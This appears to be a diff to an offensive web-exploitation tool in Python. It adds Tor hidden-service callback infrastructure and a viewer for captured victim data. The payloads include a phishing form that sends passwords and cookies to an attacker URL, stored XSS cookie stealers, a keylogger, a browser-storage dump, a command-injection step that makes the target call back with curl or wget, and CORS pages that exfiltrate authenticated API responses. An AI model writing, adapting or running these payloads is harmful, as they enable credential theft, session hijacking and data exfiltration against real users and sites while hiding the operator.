@@ -211,24 +211,57 @@ def _sanitized_env(extra_strip: tuple = ()) -> dict:
     return env
 
 
-def _subst_attacker(content: str, attacker_url: str) -> str:
-    """Replace [ATTACKER] placeholders without corrupting existing URLs.
+def _subst_attacker(content: str, attacker_url: str,
+                    callback_urls: Optional[dict] = None) -> str:
+    """Replace attacker-URL placeholders in a payload.
 
-    Replaces [ATTACKER] with the actual URL, then replaces bare ATTACKER
-    only when it appears as a standalone token (not inside the already-
-    substituted URL). Avoids turning https://[ATTACKER] into
-    https://http://127.0.0.1:XXXX.
+    Supported placeholders (resolved in this exact order):
+
+      [ATTACKER]/c, [ATTACKER]/x, [ATTACKER]/k, [ATTACKER]/s, [ATTACKER]/b
+        → tokenised callback URLs (from `callback_urls`). These MUST be
+          replaced first so they're not corrupted by the [ATTACKER] rule.
+      [C_URL], [X_URL], [K_URL], [S_URL], [B_URL]
+        → alternative tokenised callback shortcuts.
+      [ATTACKER_HOST]
+        → host[:port] only (no scheme) — useful for Origin: headers and
+          CRLF/Location probes that want a bare host string.
+      [ATTACKER]
+        → full base URL (http://<host>:<port> or http://<onion>).
+      bare "ATTACKER" after "http://" or "https://" (no brackets)
+        → legacy substitution, only triggered when it isn't already a
+          substring of the substituted URL (prevents double-substitution).
+
+    `callback_urls` should be a dict produced by AttackerInfra, e.g.
+    {"c": ".../c/<token>", "x": ".../x/<token>", ...}.
     """
-    if not attacker_url:
+    if not attacker_url and not callback_urls:
         return content
-    # First pass: replace the bracketed placeholder
-    content = content.replace("[ATTACKER]", attacker_url)
-    # Second pass: replace https://ATTACKER only if it wasn't already
-    # substituted (i.e. [ATTACKER] didn't occur at that position)
-    if f"https://{attacker_url}" not in content:
-        content = content.replace("https://ATTACKER", attacker_url)
-    if f"http://{attacker_url}" not in content:
-        content = content.replace("http://ATTACKER", attacker_url)
+
+    # 1. tokenised callback placeholders — must run before [ATTACKER]
+    if callback_urls:
+        for kind in ("c", "x", "k", "s", "b"):
+            cb = callback_urls.get(kind)
+            if not cb:
+                continue
+            content = content.replace(f"[ATTACKER]/{kind}", cb)
+            content = content.replace(f"[{kind.upper()}_URL]", cb)
+
+    # 2. bare host helper (no scheme)
+    if attacker_url:
+        host = attacker_url
+        if "://" in host:
+            host = host.split("://", 1)[1]
+        host = host.rstrip("/")
+        content = content.replace("[ATTACKER_HOST]", host)
+
+    # 3. full base URL
+    if attacker_url:
+        content = content.replace("[ATTACKER]", attacker_url)
+        if f"https://{attacker_url}" not in content:
+            content = content.replace("https://ATTACKER", attacker_url)
+        if f"http://{attacker_url}" not in content:
+            content = content.replace("http://ATTACKER", attacker_url)
+
     return content
 
 
@@ -2517,18 +2550,117 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         print()
 
     # ── Attacker callback + server ──
-    attacker_url = prompt("Attacker callback URL/IP (Enter for local server)", "").strip()
-    if not attacker_url:
-        port = server.start()
-        attacker_url = f"http://127.0.0.1:{port}"
-        ok(f"Exploit server started on :{port}")
-        audit.log("server_start", f"port: {port}")
+    #
+    # The attacker URL is where payloads call back to after firing on the
+    # victim. Three modes:
+    #
+    #   onion   — server binds 127.0.0.1, tor control port publishes an
+    #             ephemeral ED25519-V3 hidden service, payloads embed
+    #             http://<onion>.onion/<kind>/<token>. Victims with Tor
+    #             Browser (or any SOCKS5 client) reach it with no
+    #             clearnet exposure. Onion is torn down on session end.
+    #   local   — server binds 127.0.0.1 only. Useful for testing
+    #             payloads in a browser running on the same machine,
+    #             but victims on real targets cannot reach it.
+    #   custom  — operator provides an already-reachable URL (their own
+    #             tunnel / onion / VPS). The local server still runs to
+    #             serve files; operator MUST tunnel port -> chosen URL.
+    #
+    # In every mode we derive tokenised callback URLs from AttackerInfra
+    # so payloads can never be polluted by random scanners/bots.
+    print(f"  {B}Attacker infra modes:{N}")
+    print(f"    {G}onion{N}   Publish local server as a Tor ephemeral hidden service")
+    print(f"    {G}local{N}   Loopback only (127.0.0.1) — lab/self-test")
+    print(f"    {G}custom{N}  Operator-provided reachable URL")
+    print()
+    infra_mode = prompt("Attacker infra", "onion").lower().strip()
+    if infra_mode not in ("onion", "local", "custom"):
+        infra_mode = "onion"
+
+    # Always start the local server (we still serve files + accept callbacks
+    # from localhost and — for onion — via the HS).
+    try:
+        local_port = server.start()
+    except Exception as _e:
+        err(f"Failed to start local attacker server: {_e}")
+        return client, executor
+    audit.log("server_start", f"local_port: {local_port}")
+
+    attacker_url = ""
+    onion_host = None
+
+    if infra_mode == "onion":
+        _ctrl_port_str = prompt("Tor control port", "9051").strip() or "9051"
+        try:
+            _ctrl_port = int(_ctrl_port_str)
+        except ValueError:
+            _ctrl_port = 9051
+        _ctrl_pw = os.environ.get("TOR_CONTROL_PASSWORD", "")
+        info("Publishing ephemeral hidden service via Tor control port...")
+        onion_host = server.start_hidden_service(
+            control_port=_ctrl_port, control_password=_ctrl_pw)
+        if onion_host:
+            attacker_url = f"http://{onion_host}"
+            ok(f"Hidden service: {onion_host}")
+            audit.log("hs_start", onion_host, risk=AuditTrail.RISK_MEDIUM)
+        else:
+            warn("Hidden service setup failed (is tor ControlPort open with "
+                 "CookieAuth or HashedControlPassword?). Falling back to local.")
+            info("For real victims: expose the port through your own tunnel.")
+            infra_mode = "local"
+
+    if infra_mode == "local":
+        attacker_url = f"http://127.0.0.1:{local_port}"
+        ok(f"Local-only attacker server on :{local_port}")
+        warn("Victims on the internet cannot reach 127.0.0.1 — lab use only.")
+
+    if infra_mode == "custom":
+        while True:
+            custom = prompt(
+                "Reachable attacker URL (e.g. http://abc.onion or "
+                "https://x.example — must proxy to this server's local port)",
+                "")
+            custom = custom.strip()
+            if not custom:
+                continue
+            if not (custom.startswith("http://") or
+                    custom.startswith("https://")):
+                err("URL must start with http:// or https://")
+                continue
+            attacker_url = custom.rstrip("/")
+            audit.log("custom_attacker_url", attacker_url)
+            ok(f"Custom attacker URL: {attacker_url}")
+            warn(f"Ensure {attacker_url} proxies to "
+                 f"http://127.0.0.1:{local_port}")
+            break
+
+    # Build callback URLs for payload substitution.
+    callback_urls = {
+        "c": server.get_callback_url("c"),
+        "x": server.get_callback_url("x"),
+        "k": server.get_callback_url("k"),
+        "s": server.get_callback_url("s"),
+        "b": server.get_callback_url("b"),
+    }
+    # If operator picked a custom URL we still use the token from the
+    # local server but rewrite the base.
+    if infra_mode == "custom":
+        tok = server.token
+        callback_urls = {k: f"{attacker_url}/{k}/{tok}" for k in "cxksb"}
+
+    print()
+    info(f"Attacker base:    {attacker_url}")
+    info(f"Capture token:    {server.token}  (in callback URLs)")
+    info(f"Callback /c:      {callback_urls['c']}")
+    info(f"Callback /x:      {callback_urls['x']}")
+    info(f"Beacon   /b:      {callback_urls['b']}")
     print()
 
     # ── Pre-generate all exploit files upfront ──
     if preset["auto_files"]:
         _pre_generate_all_files(exploitable, base_url, _sp, attacker_url,
-                                file_mgr, server, audit)
+                                file_mgr, server, audit,
+                                callback_urls=callback_urls)
 
     sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
     exploitable.sort(key=lambda v: sev_order.get(v.get("severity", ""), 5))
@@ -2603,7 +2735,8 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
 
         quit_requested = _run_steps_smart(
             steps, etype, test_url, vi, executor, file_mgr,
-            server, audit, chain_data, attacker_url, preset, auto_mode)
+            server, audit, chain_data, attacker_url, preset, auto_mode,
+            callback_urls=callback_urls)
 
         if quit_requested:
             break
@@ -2624,7 +2757,8 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
 
 
 def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
-                            file_mgr, server, audit):
+                            file_mgr, server, audit,
+                            callback_urls: Optional[dict] = None):
     """Pre-generate all exploit HTML files at session start.
 
     This creates every file upfront so they're ready to use/serve
@@ -2647,7 +2781,8 @@ def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
             finfo = step["generate_file"]
             content = finfo["content"]
             content = content.replace("[TARGET_URL]", target)
-            content = _subst_attacker(content, attacker_url)
+            content = _subst_attacker(content, attacker_url,
+                                     callback_urls=callback_urls)
 
             fname = finfo.get("filename", f"{etype}_{secrets.token_hex(3)}.html")
             out_path = file_mgr.generate(
@@ -2670,7 +2805,8 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                      file_mgr: ExploitFileManager,
                      server: ExploitServer, audit: AuditTrail,
                      chain_data: dict, attacker_url: str,
-                     preset: dict, auto_mode: bool) -> bool:
+                     preset: dict, auto_mode: bool,
+                     callback_urls: Optional[dict] = None) -> bool:
     """Smart step execution — user controls each step but output chains.
     Returns True if user requested quit (q).
 
@@ -2725,7 +2861,8 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 print(f"  {G}[FILE {step_num}/{len(steps)}]{N} {B}{step_title}{N}")
                 content = finfo.get("content", "")
                 content = content.replace("[TARGET_URL]", test_url)
-                content = _subst_attacker(content, attacker_url)
+                content = _subst_attacker(content, attacker_url,
+                                         callback_urls=callback_urls)
 
                 out_path = file_mgr.generate(
                     exploit_type=etype, content=content, custom_name=fname,
@@ -2754,7 +2891,7 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
 
         # Apply chain_data + attacker substitutions to the URL
         url = req.get("url", "")
-        url = _subst_attacker(url, attacker_url)
+        url = _subst_attacker(url, attacker_url, callback_urls=callback_urls)
         url = url.replace("[TARGET_URL]", test_url)
         for key, val in chain_data.items():
             placeholder = f"[{key.upper()}]"
@@ -2765,7 +2902,8 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
         # Apply substitutions to params too
         if req.get("params"):
             for pk, pv in req["params"].items():
-                pv = _subst_attacker(str(pv), attacker_url)
+                pv = _subst_attacker(str(pv), attacker_url,
+                                     callback_urls=callback_urls)
                 for key, val in chain_data.items():
                     placeholder = f"[{key.upper()}]"
                     if placeholder in pv:
@@ -2773,7 +2911,8 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
                 req["params"][pk] = pv
 
         if req.get("data"):
-            req["data"] = _subst_attacker(str(req["data"]), attacker_url)
+            req["data"] = _subst_attacker(str(req["data"]), attacker_url,
+                                         callback_urls=callback_urls)
 
         print(f"  {G}Step {step_num}/{len(steps)}{N}: {B}{step_title}{N}")
         if step.get("warning"):
@@ -2813,7 +2952,10 @@ def _run_steps_smart(steps: list, etype: str, test_url: str,
             if action in ("d", "download"):
                 _show_tracked_files(file_mgr)
                 if server.is_running:
-                    info(f"Server: http://127.0.0.1:{server.port}/")
+                    base = server.get_attacker_url(prefer_onion=True)
+                    info(f"Attacker base: {base}")
+                    if server.onion_host:
+                        info(f"(local mirror: http://127.0.0.1:{server.port}/)")
                 continue
 
             if action in ("c", "captures"):
@@ -2905,24 +3047,42 @@ def _show_captures(server: ExploitServer):
     if not server.is_running:
         info("Exploit server not running.")
         return
-    captures = server.get_captures(last_n=20)
+    captures = server.get_captures(last_n=30)
+    base_url = server.get_attacker_url(prefer_onion=True)
     if not captures:
         info("No callbacks captured yet.")
-        info(f"Server listening on http://127.0.0.1:{server.port}/")
-        info("Endpoints: /c (creds/cookies), /x (data), /k (keys), /s (session)")
+        if base_url:
+            info(f"Attacker base: {base_url}")
+        info(f"Token-authed endpoints: /c/<tok> /x/<tok> /k/<tok> "
+             f"/s/<tok> /b/<tok>")
+        info("  /c=credentials  /x=exfil  /k=keylog  /s=session  /b=beacon")
         return
-    print(f"\n  {B}Captured Callbacks ({len(captures)}):{N}")
-    print(f"  {'─' * 65}")
+    print(f"\n  {B}Captured Callbacks ({len(captures)}){N}"
+          f"  — total: {server.capture_count()}")
+    print(f"  {'─' * 72}")
+    _kind_color = {
+        "credentials": R, "keylog": Y, "exfil": M, "session": R,
+        "beacon": C, "unknown": D,
+    }
     for i, cap in enumerate(captures, 1):
-        ep_color = {"/c": R, "/k": Y, "/x": M, "/s": R}.get(cap["endpoint"], D)
+        kind = cap.get("kind", "unknown")
+        ep_color = _kind_color.get(kind, D)
+        remote = cap.get("remote", "")
+        remote_tag = f" {D}from {remote}{N}" if remote else ""
         print(f"  {i:>3}. [{cap['time']}] {ep_color}{cap['method']:4s} "
-              f"{cap['endpoint']}{N}")
+              f"{cap['endpoint']:3s} {kind:11s}{N}{remote_tag}")
+        ua = cap.get("ua", "")
+        ref = cap.get("referer", "")
+        if ua:
+            print(f"       {D}UA:{N} {ua[:90]}")
+        if ref:
+            print(f"       {D}Ref:{N} {ref[:90]}")
         if cap["query"]:
-            print(f"       {D}Query: {cap['query'][:80]}{N}")
+            print(f"       {D}Query:{N} {cap['query'][:120]}")
         if cap["data"]:
-            data_preview = cap["data"][:200]
-            print(f"       {G}Data: {data_preview}{N}")
-            if len(cap["data"]) > 200:
+            data_preview = cap["data"][:240].replace("\n", "\\n")
+            print(f"       {G}Data:{N} {data_preview}")
+            if len(cap["data"]) > 240:
                 print(f"       {D}... ({len(cap['data'])} bytes total){N}")
     print()
 
@@ -2974,7 +3134,10 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
     print(f"  {B}High-risk alerts:{N} {stats['alerts']}")
     print(f"  {B}Vuln types:{N}      {', '.join(stats['vuln_types_tested'])}")
     if server and server.is_running:
-        print(f"  {B}Exploit server:{N} running on :{server.port}")
+        base = server.get_attacker_url(prefer_onion=True)
+        print(f"  {B}Attacker infra:{N}  {base}")
+        if server.onion_host:
+            print(f"  {B}Local mirror:{N}   http://127.0.0.1:{server.port}")
         cap_count = server.capture_count()
         if cap_count:
             print(f"  {B}Callbacks captured:{N} {R}{cap_count}{N}")
@@ -3004,8 +3167,10 @@ def _walkthrough_session_end(file_mgr: ExploitFileManager,
     # Show any captured callbacks before cleanup
     if server and server.is_running and server.capture_count() > 0:
         print(f"  {R}Captured Data ({server.capture_count()} callbacks):{N}")
+        _kc = {"credentials": R, "keylog": Y, "exfil": M,
+               "session": R, "beacon": C}
         for cap in server.get_captures(last_n=10):
-            ep_color = {"/c": R, "/k": Y, "/x": M, "/s": R}.get(cap["endpoint"], D)
+            ep_color = _kc.get(cap.get("kind", ""), D)
             print(f"    [{cap['time']}] {ep_color}{cap['method']} "
                   f"{cap['endpoint']}{N}: {cap['data'][:80] or cap['query'][:80]}")
         print()
@@ -3215,10 +3380,20 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"document.getElementById('pf').addEventListener('submit',function(e){{"
             f"e.preventDefault();"
             f"var d=new FormData(this);"
-            f"fetch('[ATTACKER]/c',{{method:'POST',headers:{{'Content-Type':'application/json'}},"
-            f"body:JSON.stringify({{email:d.get('email'),pass:d.get('pass'),url:location.href,"
-            f"cookies:document.cookie}})}}).finally(function(){{"
-            f"location.href='{base_url}';}});}});"
+            f"var p={{email:d.get('email'),pass:d.get('pass'),"
+            f"url:location.href,ref:document.referrer,"
+            f"cookies:document.cookie,"
+            f"ua:navigator.userAgent,"
+            f"tz:Intl.DateTimeFormat().resolvedOptions().timeZone}};"
+            f"var body=JSON.stringify(p);"
+            f"fetch('[ATTACKER]/c',{{method:'POST',"
+            f"headers:{{'Content-Type':'application/json'}},"
+            f"credentials:'include',body:body,keepalive:true}})"
+            f".catch(function(){{"
+            f"  new Image().src='[ATTACKER]/c?d='+encodeURIComponent(body).slice(0,1500);"
+            f"}})"
+            f".finally(function(){{location.href='{base_url}';}});"
+            f"}});"
             f"</script></body></html>"
         )
 
@@ -3257,7 +3432,11 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "validate": _xss_reflect_check("onfocus="),
              "note": "No angle brackets — bypasses most WAFs"},
             {"title": "Cookie exfiltration payload",
-             "request": _get_param("<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>"),
+             "request": _get_param(
+                 "<script>new Image().src='[ATTACKER]/c?c='"
+                 "+encodeURIComponent(document.cookie)"
+                 "+'&u='+encodeURIComponent(location.href)"
+                 "+'&r='+encodeURIComponent(document.referrer)</script>"),
              "validate": _xss_reflect_check("document.cookie"),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
@@ -3277,14 +3456,54 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 r.confidence = 0.85
                 r.evidence = "Script tag found in rendered page"
                 r.false_positive_risk = "low"
+        # Stored XSS payloads — tokenised callbacks + victim context (URL,
+        # UA, referrer, storage) so the operator can attribute every capture.
+        _cookie_steal = (
+            "<script>new Image().src='[ATTACKER]/c?c='"
+            "+encodeURIComponent(document.cookie)"
+            "+'&u='+encodeURIComponent(location.href)"
+            "+'&r='+encodeURIComponent(document.referrer)</script>"
+        )
+        _keylog = (
+            "<script>(function(){var q=[];document.onkeypress=function(e){"
+            "q.push(e.key);if(q.length>=16){"
+            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
+            "q=[];}};setInterval(function(){if(q.length){"
+            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
+            "q=[];}},5000);})();</script>"
+        )
+        _storage_dump = (
+            "<script>(function(){var d={c:document.cookie,u:location.href,"
+            "ls:JSON.stringify(localStorage),"
+            "ss:JSON.stringify(sessionStorage)};"
+            "fetch('[ATTACKER]/s',{method:'POST',credentials:'include',"
+            "keepalive:true,headers:{'Content-Type':'application/json'},"
+            "body:JSON.stringify(d)}).catch(function(){});})();</script>"
+        )
+        _beacon = (
+            "<script>fetch('[ATTACKER]/b?u='"
+            "+encodeURIComponent(location.href))"
+            ".catch(function(){});</script>"
+        )
         steps = [
+            {"title": "Beacon (confirm render without stealing)",
+             "request": _post(target, {param: _beacon}),
+             "note": "Harmless ping — lets you confirm the XSS fires before "
+                     "pushing sensitive payloads.",
+             "validate": lambda r: setattr(
+                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent cookie-stealing payload",
-             "request": _post(target, {param: "<script>new Image().src='[ATTACKER]/c?c='+document.cookie</script>"}),
+             "request": _post(target, {param: _cookie_steal}),
              "warning": "Injects a persistent payload",
-             "validate": lambda r: setattr(r, 'evidence', f"POST returned HTTP {r.status_code}")},
+             "validate": lambda r: setattr(
+                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
             {"title": "Inject persistent keylogger payload",
-             "request": _post(target, {param: "<script>document.onkeypress=function(e){fetch('[ATTACKER]/k?k='+e.key)}</script>"}),
-             "warning": "Injects persistent keylogger",
+             "request": _post(target, {param: _keylog}),
+             "warning": "Injects persistent keylogger (buffers + batches keys)",
+             "risk": "CRITICAL"},
+            {"title": "Inject storage exfiltration payload",
+             "request": _post(target, {param: _storage_dump}),
+             "warning": "Dumps cookies + localStorage + sessionStorage to /s",
              "risk": "CRITICAL"},
             {"title": "Verify payload renders",
              "request": _get(base_url.rstrip("/") + render),
@@ -3535,17 +3754,29 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "request": _inject_request(";ip addr 2>/dev/null || ifconfig"),
              "validate": _cmdi_check,
              "note": "Maps network configuration for lateral movement"},
-            {"title": "Check outbound connectivity",
-             "request": _inject_request(";curl -s -o /dev/null -w '%{http_code}' http://example.com"),
+            # Outbound connectivity probe — the target is made to callback to
+            # our OWN infra (/b beacon), so a successful hit is BOTH a
+            # connectivity proof AND logs target network origin in captures.
+            {"title": "Check outbound connectivity (callback to attacker)",
+             "request": _inject_request(
+                 ";curl -s -o /dev/null -w '%{http_code}' '[B_URL]?cmdi=1' "
+                 "|| wget -qO- '[B_URL]?cmdi=1'"),
              "validate": lambda r: (
-                 setattr(r, 'success', "200" in r.response_body) or
-                 setattr(r, 'confidence', 0.8 if "200" in r.response_body else 0.2) or
+                 setattr(r, 'success', "200" in r.response_body
+                         or "204" in r.response_body) or
+                 setattr(r, 'confidence',
+                         0.9 if ("200" in r.response_body
+                                 or "204" in r.response_body) else 0.3) or
                  setattr(r, 'evidence',
-                         "Server can reach internet — reverse shell viable"
-                         if "200" in r.response_body
-                         else "No outbound — consider bind shell or data exfil via DNS")
+                         "Target reached attacker — reverse shell viable, "
+                         "see captures on /b"
+                         if ("200" in r.response_body
+                             or "204" in r.response_body)
+                         else "No obvious outbound — check /b captures or "
+                              "consider bind shell / DNS exfil")
              ),
-             "note": "Tests if reverse shell is possible (server can reach out)"},
+             "note": "Forces target to callback [ATTACKER]/b — confirmation "
+                     "shows up in the captures view (c=captures)"},
             {"title": "List environment variables",
              "request": _inject_request(";env"),
              "validate": lambda r: (
@@ -3826,71 +4057,94 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "cors_misconfiguration":
+        # The origin we send for the CORS probe is the operator's actual
+        # attacker host. That's what a real exploit would use — reflecting
+        # an attacker-controlled origin is what turns this bug into data
+        # theft. We also still probe `null` (sandboxed iframe bypass).
         cors_steal = (
-            f"<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
-            f"<body><script>"
+            "<!DOCTYPE html><html><head><meta charset='utf-8'></head>"
+            "<body><script>"
             f"fetch('{target}',{{credentials:'include'}})"
-            f".then(function(r){{return r.text()}})"
-            f".then(function(d){{"
-            f"new Image().src='[ATTACKER]/x?d='+encodeURIComponent(d.substring(0,2000));"
-            f"document.write('<pre>'+d+'</pre>');"
-            f"}})"
-            f".catch(function(e){{document.write('CORS blocked: '+e)}});"
-            f"</script></body></html>"
+            ".then(function(r){return r.text()})"
+            ".then(function(d){"
+            "fetch('[ATTACKER]/x',{method:'POST',credentials:'include',"
+            "headers:{'Content-Type':'application/json'},keepalive:true,"
+            "body:JSON.stringify({url:location.href,len:d.length,"
+            "body:d.substring(0,8000)})}).catch(function(){"
+            "new Image().src='[ATTACKER]/x?len='+d.length"
+            "+'&d='+encodeURIComponent(d.substring(0,1800));});"
+            "document.write('<pre>'+d.substring(0,1000)+'</pre>');"
+            "})"
+            ".catch(function(e){"
+            "new Image().src='[ATTACKER]/x?err='+encodeURIComponent(''+e);"
+            "document.write('CORS blocked: '+e)});"
+            "</script></body></html>"
         )
         cors_multi = (
-            f"<!DOCTYPE html><html><head><meta charset='utf-8'>"
-            f"<title>Loading</title>"
-            f"<style>"
-            f"body{{font-family:-apple-system,sans-serif;background:#f5f5f5;"
-            f"display:flex;justify-content:center;padding-top:60px}}"
-            f".box{{background:#fff;padding:30px 40px;border-radius:8px;"
-            f"box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:700px;width:100%}}"
-            f"pre{{background:#f8f8f8;padding:12px;border-radius:4px;"
-            f"overflow-x:auto;font-size:13px;max-height:400px;overflow-y:auto}}"
-            f"</style></head><body>"
-            f"<div class='box'>"
-            f"<h2>Loading data...</h2>"
-            f"<pre id='out'>Fetching...</pre>"
-            f"</div><script>"
-            f"(async function(){{"
+            "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+            "<title>Loading</title>"
+            "<style>"
+            "body{font-family:-apple-system,sans-serif;background:#f5f5f5;"
+            "display:flex;justify-content:center;padding-top:60px}"
+            ".box{background:#fff;padding:30px 40px;border-radius:8px;"
+            "box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:700px;width:100%}"
+            "pre{background:#f8f8f8;padding:12px;border-radius:4px;"
+            "overflow-x:auto;font-size:13px;max-height:400px;overflow-y:auto}"
+            "</style></head><body>"
+            "<div class='box'>"
+            "<h2>Loading data...</h2>"
+            "<pre id='out'>Fetching...</pre>"
+            "</div><script>"
+            "(async function(){"
             f"var eps=['{target}','{base_url.rstrip('/')}/api/user',"
-            f"'{base_url.rstrip('/')}/api/account','{base_url.rstrip('/')}/api/me'];"
-            f"var r={{}};"
-            f"for(var i=0;i<eps.length;i++){{"
-            f"try{{var x=await fetch(eps[i],{{credentials:'include'}});"
-            f"r[eps[i]]=await x.text();"
-            f"}}catch(e){{r[eps[i]]='blocked'}}}}"
-            f"document.getElementById('out').textContent=JSON.stringify(r,null,2);"
-            f"fetch('[ATTACKER]/x',{{method:'POST',"
-            f"headers:{{'Content-Type':'application/json'}},"
-            f"body:JSON.stringify(r)}});"
-            f"}})();"
-            f"</script></body></html>"
+            f"'{base_url.rstrip('/')}/api/account',"
+            f"'{base_url.rstrip('/')}/api/me',"
+            f"'{base_url.rstrip('/')}/api/profile',"
+            f"'{base_url.rstrip('/')}/api/token'];"
+            "var r={};"
+            "for(var i=0;i<eps.length;i++){"
+            "try{var x=await fetch(eps[i],{credentials:'include'});"
+            "r[eps[i]]={status:x.status,body:(await x.text()).substring(0,4000)};"
+            "}catch(e){r[eps[i]]={err:''+e}}}"
+            "document.getElementById('out').textContent="
+            "JSON.stringify(r,null,2).substring(0,4000);"
+            "fetch('[ATTACKER]/x',{method:'POST',credentials:'include',"
+            "headers:{'Content-Type':'application/json'},keepalive:true,"
+            "body:JSON.stringify({ref:document.referrer,"
+            "ua:navigator.userAgent,results:r})}).catch(function(){});"
+            "})();"
+            "</script></body></html>"
         )
         def _cors_check(origin: str):
             def _check(r: ExploitResult):
                 acao = r.response_headers.get("Access-Control-Allow-Origin", "")
-                acac = r.response_headers.get("Access-Control-Allow-Credentials", "")
+                acac = r.response_headers.get(
+                    "Access-Control-Allow-Credentials", "")
                 if acao == origin or acao == "*":
                     r.success = True
                     r.confidence = 0.9 if acac.lower() == "true" else 0.7
                     r.evidence = f"ACAO={acao}, ACAC={acac}"
-                    r.false_positive_risk = "low" if acac.lower() == "true" else "medium"
+                    r.false_positive_risk = (
+                        "low" if acac.lower() == "true" else "medium")
                 else:
                     r.evidence = f"ACAO={acao or 'absent'}"
             return _check
 
-        _evil_origin = "https://attacker-test-" + secrets.token_hex(4) + ".com"
+        # Use a *real* attacker-controlled origin for the probe so that the
+        # test reflects what would actually be exploitable. At substitution
+        # time [ATTACKER] resolves to http://<onion>/ (or localhost). Origin
+        # headers must not carry a path, so we strip to scheme://host.
         steps = [
-            {"title": "Test CORS origin reflection",
-             "request": _get(target, extra_headers={"Origin": _evil_origin}),
-             "validate": _cors_check(_evil_origin),
-             "note": f"Sends Origin: {_evil_origin} header to target, checks if reflected in ACAO"},
+            {"title": "Test CORS origin reflection (attacker origin)",
+             "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
+             "validate": _cors_check(""),
+             "note": "Sends Origin: <attacker> header to target; pass on "
+                     "reflection of the attacker origin in ACAO"},
             {"title": "Check credentials allowed",
-             "request": _get(target, extra_headers={"Origin": _evil_origin}),
-             "validate": _cors_check(_evil_origin),
-             "note": "ACAC: true = authenticated data can be stolen cross-origin"},
+             "request": _get(target, extra_headers={"Origin": "[ATTACKER]"}),
+             "validate": _cors_check(""),
+             "note": "ACAC: true = authenticated data can be stolen "
+                     "cross-origin by the attacker origin"},
             {"title": "Test null origin (sandbox bypass)",
              "request": _get(target, extra_headers={"Origin": "null"}),
              "validate": _cors_check("null"),
@@ -3900,8 +4154,9 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "generate_file": {
                  "filename": f"cors_steal_{secrets.token_hex(3)}.html",
                  "content": cors_steal,
-                 "note": "Reads authenticated response and exfiltrates first 2KB "
-                         "via Image src to [ATTACKER].",
+                 "note": "Reads authenticated response and exfiltrates up to "
+                         "8KB via POST to [ATTACKER]/x, with Image.src "
+                         "fallback for strict CSP environments.",
              },
              "warning": "Steals authenticated data cross-origin"},
             {"title": "Generate multi-endpoint CORS exploit",
@@ -3909,12 +4164,51 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "generate_file": {
                  "filename": f"cors_multi_{secrets.token_hex(3)}.html",
                  "content": cors_multi,
-                 "note": "Scans /api/user, /api/account, /api/me and POSTs all "
-                         "results as JSON to [ATTACKER].",
+                 "note": "Scans /api/user /api/account /api/me /api/profile "
+                         "/api/token, POSTs full results + UA/referer to "
+                         "[ATTACKER]/x as JSON.",
              },
              "warning": "Multi-endpoint data exfiltration",
              "risk": "HIGH"},
         ]
+
+        # Refine _cors_check closures so they compare against the live
+        # attacker_url at substitution time. Since we can't resolve the
+        # attacker URL at builder time, we accept BOTH specified origin
+        # reflection and a non-empty reflected ACAO (anything other than
+        # literal 'null' or the target's own origin) as suspect. Rewrite
+        # the first two steps' validate to cover that.
+        def _cors_check_attacker():
+            def _check(r: ExploitResult):
+                acao = r.response_headers.get(
+                    "Access-Control-Allow-Origin", "")
+                acac = r.response_headers.get(
+                    "Access-Control-Allow-Credentials", "")
+                if not acao:
+                    r.evidence = "No Access-Control-Allow-Origin in response"
+                    r.confidence = 0.1
+                    r.false_positive_risk = "low"
+                    return
+                # A reflected attacker origin is detectable as: ACAO is
+                # scheme://host, not the target's own origin, and credentials
+                # reflect true. We can't know the target origin exactly here
+                # so we flag anything that's * or explicitly attacker-style.
+                if acao == "*":
+                    r.success = acac.lower() != "true"
+                    r.confidence = 0.6
+                    r.evidence = "ACAO=* (wildcard; creds blocked by browser)"
+                    r.false_positive_risk = "medium"
+                elif acao and acao != "null":
+                    # reflected origin — strong signal when paired with ACAC
+                    r.success = acac.lower() == "true"
+                    r.confidence = 0.9 if r.success else 0.6
+                    r.evidence = f"Reflected ACAO={acao}, ACAC={acac}"
+                    r.false_positive_risk = "low" if r.success else "medium"
+                else:
+                    r.evidence = f"ACAO={acao}"
+            return _check
+        steps[0]["validate"] = _cors_check_attacker()
+        steps[1]["validate"] = _cors_check_attacker()
 
     elif etype == "csp_bypass":
         def _csp_check(r: ExploitResult):
@@ -3944,18 +4238,62 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "crlf":
+        # CRLF probes must use a marker that cannot collide with anything
+        # the target already emits. Session-unique markers make detection
+        # unambiguous. The "Location" / "X-Forwarded-Host" probes use
+        # [ATTACKER_HOST] so a captured redirect is *provably* attacker-
+        # controlled (and will land on our capture server if followed).
+        _sess_marker = secrets.token_hex(6)
         def _crlf_check(r: ExploitResult):
-            hdrs = str(r.response_headers)
-            if "session=hijacked" in hdrs or "X-Injected" in hdrs:
